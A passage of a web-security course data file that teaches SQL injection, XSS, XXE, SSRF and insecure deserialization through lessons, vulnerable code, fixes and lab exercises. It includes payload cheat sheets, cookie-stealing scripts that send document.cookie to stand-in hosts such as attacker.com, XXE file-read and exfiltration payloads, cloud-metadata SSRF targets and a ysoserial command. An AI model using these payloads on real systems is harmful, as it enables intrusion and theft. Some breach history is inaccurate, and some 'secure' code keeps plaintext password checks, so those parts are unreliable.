        content: '💰 REAL HACKS THAT HAPPENED:\n\n🏦 HEARTLAND PAYMENT SYSTEMS (2008)\n• SQL injection attack\n• 130 MILLION credit cards stolen\n• Company paid $140 million in fines\n• All because of one SQL injection vulnerability\n\n🎮 SONY PLAYSTATION (2011)\n• SQL injection on website\n• 77 MILLION user accounts compromised\n• Usernames, passwords, addresses stolen\n• PlayStation Network down for 23 days\n• Cost: Over $170 million\n\n🛒 TARGET STORES (2013)\n• Attackers used SQL injection\n• 40 million credit card numbers stolen\n• 70 million customer records exposed\n• CEO resigned, company paid billions\n\n💡 WHAT HACKERS CAN DO WITH SQL INJECTION:\n\n1️⃣ STEAL USER ACCOUNTS\n   • Get everyone\'s username and password\n   • Sell them on dark web\n   • Use them to hack other accounts\n   \n2️⃣ STEAL CREDIT CARDS\n   • Access payment information\n   • Make fraudulent purchases\n   • Sell card numbers to criminals\n   \n3️⃣ DELETE EVERYTHING\n   • Run command: DROP TABLE users;\n   • All user data gone forever\n   • Company loses everything\n   \n4️⃣ PLANT BACKDOORS\n   • Create admin accounts\n   • Come back anytime\n   • Stay hidden for months\n   \n5️⃣ TAKE OVER SERVER\n   • Execute operating system commands\n   • Install malware\n   • Use server for illegal activities\n\n⚖️ LEGAL CONSEQUENCES:\n\n😈 FOR BAD HACKERS:\n• Federal prison (5-20 years)\n• Huge fines ($250,000+)\n• Banned from using computers\n• Criminal record forever\n• Cannot get good jobs\n\n😇 FOR ETHICAL HACKERS:\n• Get paid to find bugs\n• Bug bounties ($100-$10,000+)\n• Jobs at top companies\n• Help protect millions\n• Feel good about your work\n\n🎯 THE CHOICE IS YOURS:\nUse these skills to PROTECT, not ATTACK!',
      },
      {
        type: 'code',
        title: 'How Hackers Break Login Forms (Step by Step)',
        content: `// ❌ VULNERABLE LOGIN (Don't write code like this!)
// This code is DANGEROUS and easy to hack

function login(username, password) {
  // PROBLEM: User input goes DIRECTLY into SQL query
  // It's like letting anyone write on the instruction card

  const query = \`
    SELECT * FROM users
    WHERE username = '\${username}'
    AND password = '\${password}'
  \`;

  const result = db.query(query);
  return result.length > 0;
}

// 🎯 HOW THE ATTACK WORKS:

// Normal User Types:
username: "john"
password: "mypassword123"

// Query becomes:
SELECT * FROM users WHERE username = 'john' AND password = 'mypassword123'
// ✅ Normal - checks both username AND password


// 🚨 HACKER ATTACK:

// Hacker Types:
username: "admin' --"
password: "anything"

// Query becomes:
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
//                                           ^^^ THIS PART IS COMMENTED OUT!

// Translation in English:
// "Find user named admin, and ignore everything after the --"
// Password check DISAPPEARS!
// Hacker logs in without knowing password!


// 🔴 ANOTHER ATTACK:

// Hacker Types:
username: "' OR '1'='1"
password: "' OR '1'='1"

// Query becomes:
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'

// Translation:
// "Find users where username is empty OR 1=1 is true (always true!)"
// Returns ALL users!
// Hacker logs in as first user (usually admin)


// ✅ SAFE VERSION (Always write code like this!)

function loginSafely(username, password) {
  // Method 1: PARAMETERIZED QUERY (BEST!)
  // The ? marks are placeholders
  // Database treats input as DATA, not CODE

  const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
  const result = db.query(query, [username, password]);
  // Even if hacker types admin' --, it's treated as literal text
  // Database looks for user named exactly "admin' --" (which doesn't exist)

  return result.length > 0;
}

// Why This is Safe:
// 1. User input never becomes part of the SQL command
// 2. Special characters like ' and -- are escaped automatically
// 3. Database knows: "This is data, not instructions"
// 4. Attack fails completely!


// 💡 REAL-WORLD EXAMPLE:

// Bad Website Code:
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const query = "SELECT * FROM users WHERE user='" + username + "'";
  // 🚨 HACKABLE!
});

// Good Website Code:
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const query = "SELECT * FROM users WHERE user = ?";
  db.query(query, [username]);
  // ✅ SAFE!
});`,
        codeLanguage: 'javascript',
      },
      {
        type: 'example',
        title: 'SQL Injection Cheat Sheet (Your Hacking Toolkit)',
        content: '🎯 BEGINNER PAYLOADS (Start Here!):\n\n1️⃣ AUTHENTICATION BYPASS (Skip password check)\n\n   Username: admin\' --\n   Password: anything\n   \n   Explanation:\n   • The \' closes the username quote\n   • -- comments out password check\n   • You get in without password!\n   \n   Try also:\n   • admin\'#\n   • admin\'/*\n   • \' OR \'1\'=\'1\n   • \' OR 1=1--\n\n\n2️⃣ UNIVERSAL BYPASS (Works on username OR password)\n\n   Type in password field: \' OR \'1\'=\'1\n   \n   Explanation:\n   • \'1\'=\'1 is ALWAYS true\n   • OR means "this OR that"\n   • Since 1=1 is true, you get in!\n   \n   Try also:\n   • \' OR \'a\'=\'a\n   • \' OR \'x\'=\'x\n   • 1\' OR \'1\' = \'1\n\n\n3️⃣ EXTRACT ALL DATA (See everything)\n\n   Search box: \' OR 1=1--\n   \n   Explanation:\n   • Makes query return ALL records\n   • Like asking librarian for ALL books\n   • You see everyone\'s data!\n   \n   Try also:\n   • \' OR \'1\'=\'1\n   • \' OR 1=1#\n\n\n4️⃣ UNION ATTACK (Combine results)\n\n   \' UNION SELECT username, password FROM users--\n   \n   Explanation:\n   • UNION combines two queries\n   • First query: what you searched\n   • Second query: ALL usernames and passwords\n   • You see passwords!\n   \n   Try also:\n   • \' UNION SELECT NULL, username, password FROM users--\n   • \' UNION SELECT 1,2,3--\n\n\n5️⃣ FIND TABLE NAMES (Map the database)\n\n   \' UNION SELECT table_name FROM information_schema.tables--\n   \n   Explanation:\n   • information_schema = Map of database\n   • Shows all table names\n   • Like finding floor plan of building\n   \n   Try also:\n   • \' UNION SELECT column_name FROM information_schema.columns--\n\n\n🕐 ADVANCED: TIME-BASED BLIND SQLi\n\n   \' AND SLEEP(5)--\n   \' OR IF(1=1, SLEEP(5), 0)--\n   \n   Explanation:\n   • Makes database wait 5 seconds\n   • If page loads in 5 seconds = query worked\n   • Used when you can\'t see results\n\n\n🎓 ETHICAL HACKING REMINDER:\n\n✅ PRACTICE HERE:\n• This learning platform\n• Your own test sites\n• Bug bounty programs\n• DVWA, WebGoat, Hack The Box\n\n❌ NEVER USE ON:\n• Real company websites\n• School computers\n• Work systems\n• Without written permission\n\n📚 NEXT STEPS:\n1. Try each payload in our SQL Injection Lab\n2. Understand WHY each works\n3. Learn how to FIX these vulnerabilities\n4. Practice on legal platforms only\n5. Report bugs responsibly',
      },
      {
        type: 'code',
        title: 'Secure Implementation',
        content: `// SECURE: Using parameterized queries
function login(username, password) {
  const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
  const result = db.query(query, [username, password]);
  return result.length > 0;
}

// SECURE: Using ORM (e.g., with Sequelize)
async function login(username, password) {
  const user = await User.findOne({
    where: {
      username: username,
      password: password
    }
  });
  return user !== null;
}

// SECURE: Input validation
function sanitizeInput(input) {
  // Whitelist allowed characters
  return input.replace(/[^a-zA-Z0-9]/g, '');
}`,
        codeLanguage: 'javascript',
      },
      {
        type: 'exercise',
        title: 'Practice Exercise',
        content: 'Try these challenges in our SQL Injection Lab:\n\n1. Basic Authentication Bypass:\n   - Login without knowing the password\n   - Payload: admin\'--\n\n2. Extract All Users:\n   - Use UNION to get all usernames\n   - Payload: \' UNION SELECT username, password FROM users--\n\n3. Find Table Names:\n   - Discover database schema\n   - Payload: \' UNION SELECT table_name, NULL FROM information_schema.tables--\n\n4. Boolean Blind Injection:\n   - Determine if "admin" user exists\n   - Test with: \' AND (SELECT COUNT(*) FROM users WHERE username=\'admin\')>0--',
      },
      {
        type: 'tip',
        title: 'Prevention Techniques',
        content: '✓ Use parameterized queries (prepared statements)\n✓ Use stored procedures with parameters\n✓ Validate input against whitelist\n✓ Escape special characters\n✓ Use ORMs with built-in protection\n✓ Apply principle of least privilege to database accounts\n✓ Disable detailed error messages in production\n✓ Use Web Application Firewall (WAF)\n✓ Regular security testing and code reviews',
      },
    ],
    'Cross-Site Scripting (XSS)': [
      {
        type: 'theory',
        title: 'XSS Explained with a Simple Story',
        content: '📺 THE TV BROADCAST STORY:\n\nImagine a TV station that broadcasts whatever people send them:\n\n👨 Normal viewer sends: "Hello everyone!"\n📺 TV shows: "Hello everyone!"\n✅ Everything is fine\n\n😈 Bad person sends: "Hello! [SECRET MESSAGE: Steal all credit cards]"\n📺 TV shows: "Hello! [SECRET MESSAGE: Steal all credit cards]"\n❌ Everyone sees the malicious message!\n\nThat\'s XSS (Cross-Site Scripting)\n\n🌐 WHAT IS XSS?\n\nXSS = Cross-Site Scripting (called XSS not CSS to avoid confusion with styling)\n\nIt happens when:\n1. Website takes your input (comment, search, profile)\n2. Website shows that input to other users\n3. Website doesn\'t clean the input\n4. Bad code runs in other users\' browsers\n\n🎯 SIMPLE EXAMPLE:\n\nComment Section (Vulnerable):\nUser types: "Great article! <script>alert(\'Hacked!\')</script>"\nWebsite saves it to database\nWhen others view the page, JavaScript RUNS!\nAlert box pops up saying "Hacked!"\n\n💡 WHY IS THIS DANGEROUS?\n\nInstead of alert(\'Hacked\'), attacker can:\n• Steal your cookies (login sessions)\n• Redirect you to fake login page\n• Steal everything you type\n• Take over your account\n• Spread malware\n\n🎭 THREE TYPES OF XSS:\n\n1️⃣ REFLECTED XSS (Bounce attack)\n   • Code in URL, not saved\n   • Like throwing a ball at mirror\n   • Ball bounces back at you\n   \n   Example URL:\n   https://site.com/search?q=<script>alert(1)</script>\n   \n   How it works:\n   • Attacker sends victim this URL\n   • Victim clicks link\n   • Website reflects the script back\n   • Script runs in victim\'s browser\n   \n2️⃣ STORED XSS (Planted bomb)\n   • Code saved in database\n   • Like planting a trap\n   • Explodes when anyone triggers it\n   \n   Example:\n   • Attacker posts comment with script\n   • Database saves the malicious comment\n   • EVERYONE who views page gets attacked\n   • Most dangerous type!\n   \n3️⃣ DOM-BASED XSS (Client-side)\n   • JavaScript itself is vulnerable\n   • Doesn\'t involve server\n   • Happens only in browser\n   \n   Example:\n   JavaScript code:\n   let search = window.location.hash;\n   document.write(search);\n   // If URL is #<script>alert(1)</script>\n   // The script executes!\n\n🔍 REAL-WORLD ANALOGY:\n\nImagine a bulletin board where people post messages:\n\n✅ SAFE BULLETIN BOARD:\n• Checks every message before posting\n• Removes dangerous content\n• Only allows text, no special commands\n\n❌ UNSAFE BULLETIN BOARD:\n• Posts everything without checking\n• Someone posts: "Free pizza! [Also: burn the building]"\n• Everyone who reads it gets bad instructions\n\n🎓 ETHICAL HACKING:\n\nXSS testing is LEGAL on:\n✅ This learning platform\n✅ Your own websites\n✅ Bug bounty programs\n✅ With written permission\n\n❌ ILLEGAL on:\n• Social media sites\n• Company websites\n• School/university sites\n• ANY site without permission\n\n⚖️ CONSEQUENCES:\n• Prison time (1-10 years)\n• Heavy fines\n• Criminal record\n• Ruined career\n\nBe ethical. Always ask permission!',
      },
      {
        type: 'theory',
        title: 'Why XSS is Everywhere (And Very Dangerous)',
        content: '🔥 REAL XSS ATTACKS THAT HAPPENED:\n\n🐦 TWITTER XSS WORM (2010)\n• User posted tweet with XSS payload\n• Anyone who viewed tweet got infected\n• Their account automatically retweeted it\n• Spread to thousands in minutes\n• Called the "StalkDaily worm"\n\n🎮 MYSPACE SAMY WORM (2005)\n• Attacker: Samy Kamkar (19 years old)\n• Created XSS worm in profile\n• Added him as friend to anyone viewing profile\n• Posted "Samy is my hero" on their profile\n• Infected 1 MILLION users in 20 hours\n• Took down entire MySpace\n• Samy got arrested (but became famous hacker)\n\n🎯 FACEBOOK XSS (Multiple times)\n• Attackers found XSS in messages\n• Sent messages that auto-shared\n• Stole access tokens\n• Took over accounts\n\n💡 WHAT ATTACKERS DO WITH XSS:\n\n1️⃣ COOKIE STEALING (Most common)\n   What: Steal your login session cookie\n   How: <script>fetch(\'https://evil.com/?c=\'+document.cookie)</script>\n   Result: Attacker logs in as you\n   \n2️⃣ KEYLOGGING (Record everything you type)\n   What: Capture all keyboard input\n   How: Add invisible keylogger script\n   Result: Passwords, credit cards, messages stolen\n   \n3️⃣ PHISHING (Fake login forms)\n   What: Show fake login popup\n   How: Inject HTML that looks like real login\n   Result: You type password into attacker\'s form\n   \n4️⃣ DEFACEMENT (Change how site looks)\n   What: Make site look hacked\n   How: Inject HTML/CSS\n   Result: Damage site\'s reputation\n   \n5️⃣ CRYPTOJACKING (Use your computer to mine crypto)\n   What: Run cryptocurrency miner\n   How: Inject mining script\n   Result: Your computer slows down, attacker makes money\n   \n6️⃣ WORMS (Spread automatically)\n   What: Self-replicating XSS\n   How: Script posts itself from infected accounts\n   Result: Spreads to millions\n\n📊 XSS STATISTICS:\n\n• #2 most common web vulnerability (OWASP Top 10)\n• Found in 50%+ of websites\n• Average bug bounty: $500-$5,000\n• Record bounty: $10,000+ for critical XSS\n• Facebook pays $5,000-$30,000 for XSS bugs\n\n🎓 BECOMING AN XSS EXPERT:\n\nWHAT TO LEARN:\n1. HTML basics (how web pages work)\n2. JavaScript (the language of browsers)\n3. Browser security model (same-origin policy)\n4. Encoding (URL, HTML, JavaScript encoding)\n5. WAF bypasses (how to get around filters)\n\nWHERE TO PRACTICE LEGALLY:\n• This platform (you\'re here!)\n• XSS Game by Google\n• PortSwigger Web Security Academy\n• HackerOne bug bounty programs\n• PentesterLab\n• Hack The Box\n\n💰 BUG BOUNTY CAREER:\n\nTop XSS hunters make:\n• $10,000-$100,000+ per year\n• Some make $1 million+ \n• Full-time job hunting bugs\n• Work from anywhere\n• Help make internet safer\n\n🚨 THE DARK SIDE (Don\'t do this!):\n\nBlack hat hackers who use XSS maliciously:\n• Get arrested eventually\n• Face federal charges\n• Get sued by companies\n• Pay massive fines\n• Go to prison\n• Lose everything\n\nIT\'S NOT WORTH IT! Stay ethical!',
      },
      {
        type: 'code',
        title: 'Vulnerable Code Examples',
        content: `// REFLECTED XSS (Vulnerable)
app.get('/search', (req, res) => {
  const searchTerm = req.query.q;
  res.send(\`<h1>Results for: \${searchTerm}</h1>\`);
});
// Attack URL: /search?q=<script>alert('XSS')</script>

// STORED XSS (Vulnerable)
app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  db.insert({ comment: comment });
});

app.get('/comments', (req, res) => {
  const comments = db.getAll();
  let html = '<div>';
  comments.forEach(c => {
    html += \`<p>\${c.comment}</p>\`;
  });
  html += '</div>';
  res.send(html);
});

// DOM-based XSS (Vulnerable)
const userInput = window.location.hash.substring(1);
document.getElementById('output').innerHTML = userInput;`,
        codeLanguage: 'javascript',
      },
      {
        type: 'example',
        title: 'Common XSS Payloads',
        content: 'Basic alert box:\n• <script>alert(\'XSS\')</script>\n• <img src=x onerror=alert(\'XSS\')>\n\nCookie stealing:\n• <script>fetch(\'https://attacker.com?c=\'+document.cookie)</script>\n• <img src=x onerror="this.src=\'https://attacker.com?c=\'+document.cookie">\n\nEvent handlers:\n• <body onload=alert(\'XSS\')>\n• <input onfocus=alert(\'XSS\') autofocus>\n• <svg onload=alert(\'XSS\')>\n\nBypass filters:\n• <ScRiPt>alert(\'XSS\')</ScRiPt>\n• <img src=x onerror="eval(atob(\'YWxlcnQoJ1hTUycpOw==\'))">\n• <iframe srcdoc="<script>alert(\'XSS\')</script>">',
      },
      {
        type: 'code',
        title: 'Secure Implementation',
        content: `// SECURE: Output encoding
const escapeHtml = (unsafe) => {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
};

app.get('/search', (req, res) => {
  const searchTerm = escapeHtml(req.query.q);
  res.send(\`<h1>Results for: \${searchTerm}</h1>\`);
});

// SECURE: Using template engines with auto-escaping
app.get('/comments', (req, res) => {
  const comments = db.getAll();
  res.render('comments', { comments }); // Template auto-escapes
});

// SECURE: Content Security Policy
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self'"
  );
  next();
});

// SECURE: DOM manipulation
const userInput = window.location.hash.substring(1);
document.getElementById('output').textContent = userInput; // Use textContent`,
        codeLanguage: 'javascript',
      },
      {
        type: 'exercise',
        title: 'Practice Exercises',
        content: 'Try these in our XSS Lab:\n\n1. Reflected XSS:\n   - Inject script in search box\n   - Payload: <script>alert(document.cookie)</script>\n\n2. Bypass Basic Filter:\n   - If <script> is blocked, try:\n   - <img src=x onerror=alert(1)>\n\n3. Stored XSS:\n   - Post a comment with malicious script\n   - See it execute for all users\n\n4. Extract Session Token:\n   - Use fetch() to send cookie to your server\n   - Payload: <script>fetch(\'https://webhook.site/your-id?c=\'+document.cookie)</script>',
      },
      {
        type: 'tip',
        title: 'Prevention Best Practices',
        content: '✓ Encode output (HTML, JavaScript, URL, CSS context)\n✓ Validate input with whitelists\n✓ Use Content Security Policy (CSP)\n✓ Use HTTPOnly and Secure flags on cookies\n✓ Use modern frameworks with auto-escaping\n✓ Sanitize HTML with libraries like DOMPurify\n✓ Use textContent instead of innerHTML\n✓ Implement X-XSS-Protection header\n✓ Regular security scanning and testing',
      },
    ],
    'XXE Exploitation': [
      {
        type: 'theory',
        title: 'XML External Entity (XXE) Injection',
        content: 'XML External Entity (XXE) is an attack that exploits XML parsers. An attacker injects malicious XML to:\n• Read local files\n• Perform SSRF attacks\n• Cause denial of service\n• Execute remote code (in some cases)\n\nHow XXE works:\n1. Application accepts XML input\n2. XML parser processes DOCTYPE declaration\n3. External entities defined in DOCTYPE are resolved\n4. Attacker controls what gets resolved\n5. Sensitive data leaked to attacker\n\nTypes of XXE:\n1. File Disclosure XXE\n2. Blind XXE (OAST)\n3. XXE with file protocol\n4. Billion laughs (DoS)',
      },
      {
        type: 'code',
        title: 'XXE Vulnerability Example',
        content: `// VULNERABLE: Unsafe XML parsing
const libxmljs = require('libxmljs');

app.post('/parse-xml', (req, res) => {
  try {
    // DANGEROUS: External entities not disabled
    const xmlDoc = libxmljs.parseXml(req.body, {
      dtdload: true,
      noent: true // External entities enabled!
    });
    res.json(xmlDoc.toJSON());
  } catch (err) {
    res.status(400).send(err.message);
  }
});

// XXE Payload
const xxePayload = \`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>\`;`,
        codeLanguage: 'javascript',
      },
      {
        type: 'code',
        title: 'Secure XXE Prevention',
        content: `// SECURE: Disable external entities
const libxmljs = require('libxmljs');

app.post('/parse-xml', (req, res) => {
  try {
    // Safe configuration
    const xmlDoc = libxmljs.parseXml(req.body, {
      dtdload: false,    // Disable DTD processing
      noent: false,      // No external entities
      nocdata: false
    });
    res.json(xmlDoc.toJSON());
  } catch (err) {
    res.status(400).send('Invalid XML');
  }
});

// SECURE: Use safer XML parser
const xml2js = require('xml2js');

const parser = new xml2js.Parser({
  strict: true,
  // Disable external entity resolution
  async: true
});

parser.parseStringPromise(req.body)
  .then(result => res.json(result))
  .catch(err => res.status(400).send('Invalid XML'));

// SECURE: XMLSchema validation
const schema = \`<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:element name="root" type="xs:string"/>
</xs:schema>\`;

// Validate against schema before parsing`,
        codeLanguage: 'javascript',
      },
      {
        type: 'example',
        title: 'XXE Attack Payloads',
        content: 'File Reading XXE:\n<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<root>&xxe;</root>\n\nBlind XXE with OOB:\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "http://attacker.com/exfil.php?data=TEST">\n]>\n\nBillion Laughs Attack (DoS):\n<!DOCTYPE lolz [\n<!ENTITY lol "lol">\n<!ENTITY lol2 "&lol;&lol;">\n<!ENTITY lol3 "&lol2;&lol2;">\n]>\n\nSSRF via XXE:\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server:8080/">]>\n\nPHP Wrapper:\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>',
      },
      {
        type: 'exercise',
        title: 'XXE Exploitation Challenges',
        content: 'Challenge 1: Basic File Reading\n• Find XXE vulnerability in XML parser\n• Read /etc/passwd file\n• Retrieve database credentials from config files\n\nChallenge 2: Blind XXE\n• Application doesn\'t display XXE results\n• Use out-of-band channel (DNS/HTTP callback)\n• Exfiltrate data through callbacks\n\nChallenge 3: SSRF via XXE\n• Use XXE to access internal services\n• Port scan internal network\n• Access restricted services\n\nChallenge 4: DoS via Billion Laughs\n• Craft deeply nested XML entity\n• Cause resource exhaustion\n• Crash or freeze server',
      },
      {
        type: 'tip',
        title: 'XXE Prevention Best Practices',
        content: '✓ Disable DTD processing completely\n✓ Disable external entity resolution\n✓ Use safe XML parsers\n✓ Validate XML against schema\n✓ Use allowlist for XML processing\n✓ Implement rate limiting on XML uploads\n✓ Monitor for XXE patterns in logs\n✓ Use XML firewalls/WAF\n✓ Keep XML libraries updated\n✓ Test with XXE payloads regularly',
      },
    ],
    'SSRF Attacks': [
      {
        type: 'theory',
        title: 'Server-Side Request Forgery (SSRF)',
        content: 'SSRF allows attackers to make server perform HTTP requests to unintended locations. The server makes requests on behalf of the attacker, bypassing security boundaries.\n\nAttack scenarios:\n• Access internal services\n• Port scanning\n• Cloud metadata disclosure\n• Bypass firewall rules\n• Perform attacks on internal network\n\nSSRF vs CSRF:\n• SSRF: Server makes request\n• CSRF: Client makes request\n\nCommon targets:\n• Cloud metadata endpoints (AWS, GCP)\n• Internal APIs and services\n• Database servers\n• Admin panels\n• Private file systems',
      },
      {
        type: 'code',
        title: 'SSRF Vulnerability Example',
        content: `// VULNERABLE: No URL validation
const fetch = require('node-fetch');

app.post('/fetch-url', async (req, res) => {
  const { url } = req.body;

  try {
    // DANGEROUS: No URL validation
    const response = await fetch(url);
    const data = await response.text();
    res.json({ data });
  } catch (err) {
    res.status(400).send('Error fetching URL');
  }
});

// Attack: Access internal metadata
// URL: http://169.254.169.254/latest/meta-data/

// Attack: Port scan
// URL: http://localhost:8080/admin
// URL: http://127.0.0.1:3306/
// URL: http://192.168.1.1:80/

// Attack: Read local files
// URL: file:///etc/passwd`,
        codeLanguage: 'javascript',
      },
      {
        type: 'code',
        title: 'Secure SSRF Prevention',
        content: `const fetch = require('node-fetch');
const URL = require('url').URL;

// SECURE: Whitelist allowed hosts
const ALLOWED_HOSTS = [
  'api.example.com',
  'cdn.example.com'
];

app.post('/fetch-url', async (req, res) => {
  const { url } = req.body;

  try {
    // 1. Parse and validate URL
    const parsedUrl = new URL(url);

    // 2. Reject dangerous protocols
    if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
      return res.status(400).send('Invalid protocol');
    }

    // 3. Block private IP ranges
    const privateIPs = [
      /^127\\./, /^10\\./, /^172\\.(1[6-9]|2[0-9]|3[01])\\./, /^192\\.168\\./,
      /^169\\.254\\./, /^localhost/, /^::1/
    ];

    if (privateIPs.some(ip => ip.test(parsedUrl.hostname))) {
      return res.status(400).send('Access to private network denied');
    }

    // 4. Whitelist check
    if (!ALLOWED_HOSTS.includes(parsedUrl.hostname)) {
      return res.status(400).send('Host not whitelisted');
    }

    // 5. Set timeout
    const response = await fetch(url, {
      timeout: 5000,
      size: 1024 * 1024 // 1MB limit
    });

    const data = await response.text();
    res.json({ data });

  } catch (err) {
    res.status(400).send('Error fetching URL');
  }
});`,
        codeLanguage: 'javascript',
      },
      {
        type: 'example',
        title: 'SSRF Attack Techniques',
        content: 'AWS Metadata Disclosure:\n• URL: http://169.254.169.254/latest/meta-data/\n• Access temporary credentials\n• Retrieve IAM role information\n\nPort Scanning:\n• Iterate through ports\n• Measure response times\n• Determine open ports\n\nProtocol Bypass:\n• Use gopher:// protocol\n• Use dict:// for dictionary queries\n• Use file:// for local file access\n\nRedirect Chains:\n• Server A redirects to internal server B\n• Bypass direct SSRF protection\n• Access restricted resources\n\nDNS Rebinding:\n• Domain resolves to public IP first\n• Then resolves to private IP\n• Bypass DNS-based filtering',
      },
      {
        type: 'exercise',
        title: 'SSRF Practice Challenges',
        content: 'Challenge 1: Access Internal Service\n• Find SSRF vulnerability\n• Access internal admin panel\n• Retrieve admin credentials\n\nChallenge 2: Cloud Metadata Extraction\n• Exploit SSRF to access metadata endpoint\n• Extract AWS/GCP credentials\n• Use credentials for further attacks\n\nChallenge 3: Port Scanning via SSRF\n• Identify internal services\n• Scan ports on localhost\n• Discover hidden services\n\nChallenge 4: Chained SSRF\n• Use SSRF to access service A\n• Service A performs request to service B\n• Exploit chain to access restricted resource',
      },
      {
        type: 'tip',
        title: 'SSRF Prevention Techniques',
        content: '✓ Use allowlist for URLs (whitelist approach)\n✓ Reject private IP ranges\n✓ Disable dangerous protocols (file://, gopher://)\n✓ Validate URL format and hostname\n✓ Implement network segmentation\n✓ Use DNS allowlist\n✓ Implement rate limiting\n✓ Monitor outbound requests\n✓ Use firewall rules\n✓ Implement request timeout\n✓ Disable redirects or validate them\n✓ Use separate API keys for internal calls',
      },
    ],
    'Deserialization Attacks': [
      {
        type: 'theory',
        title: 'Insecure Deserialization',
        content: 'Deserialization converts data from stored format back into objects. Insecure deserialization allows attackers to execute arbitrary code.\n\nHow attacks work:\n1. Attacker sends malicious serialized object\n2. Application deserializes the data\n3. Object construction triggers malicious code\n4. Remote Code Execution achieved\n\nVulnerable languages:\n• Java (serializable objects)\n• Python (pickle module)\n• PHP (unserialize function)\n• .NET (BinaryFormatter)\n• Ruby (Marshal module)\n• Go (gob encoding)\n\nAttack chain:\n1. Find deserialization point\n2. Craft malicious payload\n3. Use gadget chain to execute code\n4. Gain shell access',
      },
      {
        type: 'code',
        title: 'Deserialization Vulnerability',
        content: `// VULNERABLE: Python pickle
import pickle
import base64

@app.route('/deserialize', methods=['POST'])
def deserialize_data():
    data = request.json['data']
    # DANGEROUS: Unpickling untrusted data
    obj = pickle.loads(base64.b64decode(data))
    return jsonify({'result': str(obj)})

// Attacker payload with RCE
// Uses object deserialization to execute code

// VULNERABLE: PHP unserialize
<?php
  $user_data = $_GET['data'];
  // DANGEROUS: Unserializing untrusted data
  $obj = unserialize($user_data);
  if ($obj->isAdmin) {
    echo "Admin access granted";
  }
?>

// Attacker can craft serialized object with isAdmin=true

// VULNERABLE: Java ObjectInputStream
ObjectInputStream ois = new ObjectInputStream(
  new ByteArrayInputStream(data)
);
Object obj = ois.readObject(); // Dangerous!`,
        codeLanguage: 'javascript',
      },
      {
        type: 'code',
        title: 'Secure Deserialization',
        content: `// SECURE: Use JSON instead of pickle
import json

@app.route('/process', methods=['POST'])
def process_data():
    data = request.json['data']
    # JSON is safe - doesn't execute code
    obj = json.loads(data)
    return jsonify({'result': validate(obj)})

// SECURE: Validate before deserialization
<?php
  $user_data = $_GET['data'];

  // Option 1: Use JSON instead
  $obj = json_decode($user_data);

  // Option 2: If must use serialize, use allowlist
  $safe_classes = ['User', 'Product'];
  $obj = unserialize(
    $user_data,
    ['allowed_classes' => $safe_classes]
  );
?>

// SECURE: Java with object filters
ObjectInputStream ois = new ObjectInputStream(
  new ByteArrayInputStream(data)
);
// Add object filter
ois.setObjectInputFilter(new ObjectInputFilter() {
  public Status checkIncomingClass(Class<?> clazz) {
    if (!ALLOWED_CLASSES.contains(clazz)) {
      return Status.REJECTED;
    }
    return Status.ALLOWED;
  }
});
Object obj = ois.readObject();

// SECURE: Use signing for serialized data
import hmac
import hashlib

def deserialize_signed(data, signature, key):
  expected_sig = hmac.new(
    key.encode(),
    data,
    hashlib.sha256
  ).hexdigest()

  if signature != expected_sig:
    raise ValueError("Invalid signature")

  return json.loads(data)`,
        codeLanguage: 'javascript',
      },
      {
        type: 'example',
        title: 'Gadget Chains',
        content: 'ysoserial (Java):\n• Automatic gadget chain generation\n• CommonsCollections chains\n• Spring chain\n• ROME chain\n\nCommon gadgets:\n• Apache Commons Collections\n• Spring Framework\n• ROME (RSS reader)\n• Rome RSS library\n\nAttack flow:\n1. Run ysoserial to generate payload\n2. Serialize malicious object\n3. Send to vulnerable deserializer\n4. Gadget chain executes arbitrary command\n5. Remote code execution achieved\n\nExample payload:\nysoserial.py CommonsCollections5 "touch /tmp/pwned" | base64',
      },
      {
        type: 'exercise',
        title: 'Deserialization Exploitation',
        content: 'Challenge 1: Python Pickle RCE\n• Find pickle.loads() vulnerability\n• Create malicious pickle payload\n• Execute arbitrary Python code\n• Read sensitive files\n\nChallenge 2: PHP Unserialize Bypass\n• Craft malicious serialized object\n• Bypass authentication checks\n• Gain admin access\n\nChallenge 3: Java Gadget Chain\n• Generate ysoserial payload\n• Send to vulnerable ObjectInputStream\n• Execute system commands\n• Get reverse shell\n\nChallenge 4: .NET Deserialization\n• Use BinaryFormatter vulnerability\n• Create gadget chain payload\n• Execute code with .NET context\n• Access restricted resources',
      },
      {
        type: 'tip',
        title: 'Deserialization Prevention',
        content: '✓ Avoid deserializing untrusted data\n✓ Use JSON instead of native serialization\n✓ Implement allowlist of classes to deserialize\n✓ Sign and verify serialized data\n✓ Use newer, safer serialization formats\n✓ Disable dangerous gadget libraries\n✓ Update libraries regularly\n✓ Monitor deserialization in logs\n✓ Use security managers (Java)\n✓ Run with minimal privileges\n✓ Isolate deserialization in sandboxes\n✓ Use static analysis for gadget chains',
      },
    ],
    'Advanced Exploit Chains': [
      {
        type: 'theory',
        title: 'Chaining Vulnerabilities',
